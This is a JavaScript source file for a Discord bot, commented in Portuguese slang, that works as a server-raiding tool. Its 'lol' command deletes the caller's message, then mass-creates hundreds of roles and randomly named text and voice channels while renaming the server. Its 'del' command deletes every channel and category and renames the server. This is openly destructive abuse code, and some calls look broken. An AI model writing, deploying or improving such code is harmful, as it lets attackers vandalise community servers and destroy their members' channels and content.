const Discord = require("discord.js");                                                            //declara que o bot usa a livraria discord.js
const client = new Discord.Client();                                                              //declara que o bot é um client do discord

client.on("ready", () => {                                                                        //se o bot tiver pronto vai executar td dentro desse bloco
    console.log(`Defoko 2.1`)
    console.log(`prontuh, creditor al le mene paradino`)
    client.user.setActivity(process.env.STATUS);
});

client.on("message", async (message) => {
    const args = message.content.slice(process.env.PREFIX).trim().split(/ +/g);
    const comando = args.shift().toLowerCase();

    const server = message.guild.channels;                                                        //declara uma variavel que é o servidor

    function makeid(length) {                                                                     //função pra gerar uma string cheia de caracteres
        let result = ' ';
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+{}:"<>?`~./|\;,';
        const charactersLength = characters.length;
        let i;
        for(i = 0; i < length; i++){
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
        return result;
    }

    if(comando === "lol") {                                                                        //se o comando for lol vai executar tudo dentro dele
       message.delete();                                                                           //deleta a mensagem do autor
       let i;                                                                                      //declara uma variavel a ser usada em um loop
       console.log(`ser humano falou ae meu parcero fode tudo ae men`)                             //manda uma msg no console falando ne
       for(i = 0; i < 499; i++){                                                                   //começa o loop que começa em 0 e vai se repetir 498 vezes incrementando 1 no i a cada loop
        message.guild.createRole('NOOT NOOT')                                                      //cria um cargo com esse nome ae
	.catch(err => {                                                                            //se der erro...
		return;                                                                            //...vai retornar nada
	});
	    message.guild.setName('uísque best waifu owu')                                           //muda o nome do sv pra esse nome ae owu
	    const textuh = makeid(32);                                                             //cria uma variavel string usando aquela function ali em cima
	    message.guild.createChannel(`${textuh}`, 'text')                                       //cria um canal com o nome a variavel textuh
	    message.guild.createChannel(`${textuh}`, 'voice');                                       //cria um canal de texto com o nome a var textuh
	if(message.guild.channels > 499) break;
       }
    }
    if(comando === "del"){                                                                         //se o comando for del vai executar td dentro dele
	    console.log(`ser humano falou ae meu parcero deleta tudo ae men`)                      //manda uma mensagem no console falando isso ae
	    message.delete();                                                                      //deleta a mensagem do autor
        server.deleteAll()                                                                         //deleta todos os canais e categorias do sv
        const texth = makeid(32);                                                                  //cria outra variavel usando aquela function ali
	    message.guild.createChannel(`${texth}`, 'text');                                       //cria um canal de texto com o nome a var texth	
	    message.guild.setName('uísque best waifu owu')                                         //coloca o nome do sv esse ae uwu
    }
});

client.login(process.env.BOT_TOKEN);                                                                        //loga no bot pra poder executar td isso

//para de olhar aqui poha
//- mene paradino
